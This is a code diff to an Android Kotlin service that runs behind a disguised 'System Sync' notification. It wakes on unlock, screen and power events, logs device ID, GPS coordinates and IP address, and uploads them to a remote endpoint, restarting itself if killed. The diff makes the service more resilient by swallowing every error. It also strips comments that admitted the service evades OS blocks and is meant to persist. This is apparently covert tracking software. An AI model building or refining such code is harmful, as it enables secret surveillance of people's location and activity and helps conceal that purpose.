@@ -28,9 +28,9 @@ import javax.net.ssl.HttpsURLConnection
 class InstantTelemetryService : Service() {
 
     private val scope = CoroutineScope(Dispatchers.IO)
-    private lateinit var connectivityManager: ConnectivityManager
+    private var connectivityManager: ConnectivityManager? = null
+    private var isReceiverRegistered = false
 
-    // Dynamically listen for hardware events (bypasses OS blocks)
     private val hardwareReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             intent?.action?.let { action ->
@@ -39,7 +39,6 @@ class InstantTelemetryService : Service() {
         }
     }
 
-    // Instantly detect internet restoration
     private val networkCallback = object : ConnectivityManager.NetworkCallback() {
         override fun onAvailable(network: Network) {
             super.onAvailable(network)
@@ -51,25 +50,35 @@ class InstantTelemetryService : Service() {
         super.onCreate()
         startDisguisedForeground()
         
-        // Register listeners dynamically so they stay alive forever
-        val filter = IntentFilter().apply {
-            addAction(Intent.ACTION_POWER_CONNECTED)
-            addAction(Intent.ACTION_USER_PRESENT)
-            addAction(Intent.ACTION_SCREEN_ON)
-        }
-        registerReceiver(hardwareReceiver, filter)
+        try {
+            val filter = IntentFilter().apply {
+                addAction(Intent.ACTION_POWER_CONNECTED)
+                addAction(Intent.ACTION_USER_PRESENT)
+                addAction(Intent.ACTION_SCREEN_ON)
+            }
+            registerReceiver(hardwareReceiver, filter)
+            isReceiverRegistered = true
+        } catch (e: Exception) {}
 
-        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        connectivityManager.registerDefaultNetworkCallback(networkCallback)
+        try {
+            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            connectivityManager?.registerDefaultNetworkCallback(networkCallback)
+        } catch (e: Exception) {}
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return START_STICKY // If Android kills it, restart it automatically
+        return START_STICKY // Ensures OS restarts the service if it gets terminated
     }
 
     override fun onDestroy() {
-        unregisterReceiver(hardwareReceiver)
-        connectivityManager.unregisterNetworkCallback(networkCallback)
+        if (isReceiverRegistered) {
+            try {
+                unregisterReceiver(hardwareReceiver)
+            } catch (e: Exception) {}
+        }
+        try {
+            connectivityManager?.unregisterNetworkCallback(networkCallback)
+        } catch (e: Exception) {}
         super.onDestroy()
     }
 
@@ -82,7 +91,7 @@ class InstantTelemetryService : Service() {
             setShowBadge(false)
         }
         val manager = getSystemService(NotificationManager::class.java)
-        manager.createNotificationChannel(channel)
+        manager?.createNotificationChannel(channel)
 
         val notification = NotificationCompat.Builder(this, channelId)
             .setContentTitle("System Sync")
@@ -128,17 +137,18 @@ class InstantTelemetryService : Service() {
             val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
             dao.insert(TelemetryRecord(timestampMs = System.currentTimeMillis(), eventType = finalEvent, deviceId = hardwareId, latitude = lat, longitude = lon, ipAddress = ipAddr))
             
-            flushOfflineQueue() // Try to upload immediately
+            flushOfflineQueue()
         }
     }
 
     private fun flushOfflineQueue() {
         scope.launch {
             val dao = TelemetryDatabase.get(this@InstantTelemetryService).telemetryDao()
-            val batch = dao.getUnsynced(100)
+            val batch = dao.getUnsynced(50)
             if (batch.isNotEmpty()) {
                 val uploader = TelemetryUploader(BuildConfig.TELEMETRY_ENDPOINT)
-                if (uploader.upload(batch) is UploadOutcome.Success) {
+                val outcome = uploader.upload(batch)
+                if (outcome is UploadOutcome.Success) {
                     dao.markSynced(batch.map { it.id })
                 }
             }
